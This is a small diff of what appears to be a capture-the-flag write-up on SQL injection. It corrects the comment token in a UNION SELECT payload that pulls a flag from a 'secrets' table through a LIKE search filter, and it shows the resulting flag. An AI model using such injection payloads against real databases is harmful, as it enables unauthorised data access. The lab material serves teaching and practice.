@@ -131,7 +131,7 @@ SELECT id, brand, model, price FROM sneakers WHERE brand LIKE '%INPUT%' OR model
 ```
 
 ```sql
-cn' UNION SELECT 1, flag, 3, 4,5,6 FROM secrets */
+cn' UNION SELECT 1, flag, 3, 4,5,6 FROM secrets /*
 ```
 ```
 flag{sqli_filter_bypass}
